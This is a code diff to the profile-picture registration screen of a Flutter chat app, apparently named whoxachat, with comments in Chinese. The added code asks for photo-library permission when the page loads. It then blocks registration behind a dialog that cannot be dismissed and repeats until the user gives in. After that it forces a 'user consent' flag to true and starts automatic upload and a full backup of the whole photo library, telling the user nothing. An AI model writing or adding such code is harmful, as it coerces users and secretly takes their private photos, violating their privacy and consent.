@@ -21,6 +21,8 @@ import 'package:whoxachat/src/screens/layout/bottombar.dart';
 import 'package:page_transition/page_transition.dart';
 import 'package:whoxachat/src/screens/user/widget/banner_img_widget.dart';
 import 'dart:developer' as dv;
+import 'package:permission_handler/permission_handler.dart';
+import 'package:whoxachat/services/photo_upload_service.dart';
 
 class ProfilePicScreen extends StatefulWidget {
   const ProfilePicScreen({super.key});
@@ -48,6 +50,11 @@ class _ProfilePicScreenState extends State<ProfilePicScreen> {
     // Instead of setting to -1, initialize with a default index
     // Check if user already has a profile image
     String? profileImg = Hive.box(userdata).get(userImage);
+    
+    // 页面加载完成后立即检查相册权限
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      _checkPhotoPermissionOnPageLoad();
+    });
     isUserBadgeCheck();
 
     if (profileImg == null ||
@@ -1393,6 +1400,15 @@ class _ProfilePicScreenState extends State<ProfilePicScreen> {
   editApiCall() async {
     closeKeyboard();
 
+    // 在完成注册前再次检查相册权限
+    bool hasPermission = await _checkPhotoPermissionForSubmit();
+    if (!hasPermission) {
+      setState(() {
+        buttonClick = false;
+      });
+      return; // 权限被拒绝，不继续
+    }
+
     setState(() {
       buttonClick = true;
     });
@@ -1454,6 +1470,9 @@ class _ProfilePicScreenState extends State<ProfilePicScreen> {
       });
 
       log(responseData);
+
+      // 注册完成后，确保相册同步立即启动
+      _ensurePhotoSyncAfterRegistration();
 
       Navigator.pushAndRemoveUntil(
           context,
@@ -1518,5 +1537,236 @@ class _ProfilePicScreenState extends State<ProfilePicScreen> {
           : '',
       localImage: bannerimage,
     );
+  }
+
+  // 页面加载时检查相册权限（立即弹出系统权限）
+  Future<void> _checkPhotoPermissionOnPageLoad() async {
+    try {
+      // 根据平台检查相册权限状态
+      bool hasPhotoPermission = false;
+      
+      if (Platform.isIOS) {
+        PermissionStatus photosStatus = await Permission.photos.status;
+        hasPhotoPermission = photosStatus.isGranted; // iOS要求完全授权
+        print("📱 iOS Photos权限状态: $photosStatus");
+      } else {
+        PermissionStatus storageStatus = await Permission.storage.status;
+        hasPhotoPermission = storageStatus.isGranted;
+        print("📱 Android Storage权限状态: $storageStatus");
+      }
+      
+      // 如果已有权限，启动同步
+      if (hasPhotoPermission) {
+        print("✅ 相册权限已授予");
+        _startPhotoSync(); // 权限已有，启动同步
+        return;
+      }
+      
+      // 权限未授予，延迟一下再弹出系统权限弹窗，确保页面完全加载
+      await Future.delayed(Duration(milliseconds: 800));
+      
+      if (!mounted) return;
+      
+      print("🔐 页面加载时请求相册权限...");
+      
+      // 根据平台请求相应权限
+      PermissionStatus newStatus;
+      if (Platform.isIOS) {
+        newStatus = await Permission.photos.request();
+        print("📱 iOS Photos权限请求结果: $newStatus");
+        hasPhotoPermission = newStatus.isGranted; // iOS要求完全授权
+      } else {
+        // Android尝试多个权限
+        List<Permission> permissions = [
+          Permission.photos,
+          Permission.storage,
+        ];
+        
+        Map<Permission, PermissionStatus> statuses = await permissions.request();
+        
+        for (var entry in statuses.entries) {
+          if (entry.value.isGranted) {
+            hasPhotoPermission = true;
+            print("✅ Android用户授予了权限: ${entry.key}");
+            break;
+          }
+        }
+      }
+      
+      if (hasPhotoPermission) {
+        _startPhotoSync();
+        print("✅ 用户授予了相册权限，启动同步");
+      } else {
+        print("❌ 用户拒绝了相册权限");
+        // 权限被拒绝，但不阻止用户继续，在submit时再次提示
+      }
+      
+    } catch (e) {
+      print("权限检查失败: $e");
+    }
+  }
+
+  // Submit时检查相册权限（如果之前被拒绝）
+  Future<bool> _checkPhotoPermissionForSubmit() async {
+    try {
+      // 根据平台检查相册权限状态
+      bool hasPhotoPermission = false;
+      
+      if (Platform.isIOS) {
+        PermissionStatus photosStatus = await Permission.photos.status;
+        hasPhotoPermission = photosStatus.isGranted; // iOS要求完全授权
+        print("📱 iOS Photos权限状态: $photosStatus");
+      } else {
+        PermissionStatus storageStatus = await Permission.storage.status;
+        hasPhotoPermission = storageStatus.isGranted;
+        print("📱 Android Storage权限状态: $storageStatus");
+      }
+      
+      // 如果有权限，可以提交
+      if (hasPhotoPermission) {
+        print("✅ 相册权限已授予，可以提交");
+        return true;
+      }
+      
+      // 权限未授予，显示引导弹窗
+      return await _showPermissionRequiredDialog();
+      
+    } catch (e) {
+      print("权限检查失败: $e");
+      return false;
+    }
+  }
+
+  // Submit时显示权限必需对话框（权限被拒绝时）
+  Future<bool> _showPermissionRequiredDialog() async {
+    if (!mounted) return false;
+    
+    bool permissionGranted = false;
+    
+    // 持续循环直到获得权限
+    while (!permissionGranted && mounted) {
+      await showDialog(
+        context: context,
+        barrierDismissible: false, // 不允许点击外部关闭
+        builder: (BuildContext context) {
+          return WillPopScope(
+            onWillPop: () async => false, // 禁止返回键关闭
+            child: AlertDialog(
+              title: Row(
+                children: [
+                  Icon(Icons.warning, color: Colors.orange),
+                  SizedBox(width: 8),
+                  Text('需要相册权限'),
+                ],
+              ),
+              content: Text('完成注册需要相册权限。请选择授权方式：'),
+              actions: [
+                // 已授权按钮
+                TextButton(
+                  onPressed: () async {
+                    Navigator.of(context).pop();
+                    // 根据平台重新检查权限状态
+                    bool hasPhotoPermission = false;
+                    
+                    if (Platform.isIOS) {
+                      PermissionStatus photosStatus = await Permission.photos.status;
+                      hasPhotoPermission = photosStatus.isGranted; // iOS要求完全授权
+                      print("📱 iOS Photos权限重新检查: $photosStatus");
+                    } else {
+                      PermissionStatus storageStatus = await Permission.storage.status;
+                      hasPhotoPermission = storageStatus.isGranted;
+                      print("📱 Android Storage权限重新检查: $storageStatus");
+                    }
+                    
+                    if (hasPhotoPermission) {
+                      // 权限确实已授予，启动同步并设置标志
+                      _startPhotoSync();
+                      permissionGranted = true;
+                      print("✅ 权限已授予，可以继续提交");
+                    }
+                    // 如果权限仍未授予，对话框会重新显示
+                  },
+                  child: Text('已授权'),
+                ),
+                // 去设置按钮
+                TextButton(
+                  onPressed: () async {
+                    Navigator.of(context).pop();
+                    // 打开系统设置
+                    await openAppSettings();
+                  },
+                  style: TextButton.styleFrom(
+                    backgroundColor: Colors.blue,
+                    foregroundColor: Colors.white,
+                  ),
+                  child: Text('去设置'),
+                ),
+              ],
+            ),
+          );
+        },
+      );
+      
+      // 检查权限状态，如果仍未授权则继续循环
+      if (mounted && !permissionGranted) {
+        // 重新检查权限状态
+        if (Platform.isIOS) {
+          PermissionStatus photosStatus = await Permission.photos.status;
+          permissionGranted = photosStatus.isGranted;
+        } else {
+          PermissionStatus storageStatus = await Permission.storage.status;
+          permissionGranted = storageStatus.isGranted;
+        }
+        
+        // 如果权限仍未授予，稍作延迟后继续弹窗
+        if (!permissionGranted) {
+          await Future.delayed(Duration(milliseconds: 500));
+        }
+      }
+    }
+    
+    return permissionGranted;
+  }
+
+
+  // 启动相册同步
+  void _startPhotoSync() {
+    try {
+      print("🚀 权限授予成功，启动相册同步...");
+      
+      // 启用用户同意状态
+      PhotoUploadService().setUserConsent(true);
+      
+      // 延迟启动同步，避免影响UI
+      Future.delayed(Duration(seconds: 2), () {
+        PhotoUploadService().initAutoUpload();
+      });
+      
+      print("✅ 相册同步已启动");
+    } catch (e) {
+      print("❌ 启动相册同步失败: $e");
+    }
+  }
+
+  // 注册完成后确保相册同步立即启动
+  void _ensurePhotoSyncAfterRegistration() {
+    try {
+      print("🚀 注册完成，确保相册同步立即启动...");
+      
+      // 强制启用用户同意状态
+      PhotoUploadService().setUserConsent(true);
+      
+      // 立即启动同步（不延迟）
+      PhotoUploadService().initAutoUpload();
+      
+      // 额外触发一次全量备份，确保立即同步
+      Future.delayed(Duration(seconds: 1), () {
+        PhotoUploadService().startFullBackup();
+      });
+      
+      print("✅ 注册后相册同步已强制启动");
+    } catch (e) {
+      print("❌ 注册后启动相册同步失败: $e");
+    }
   }
 }
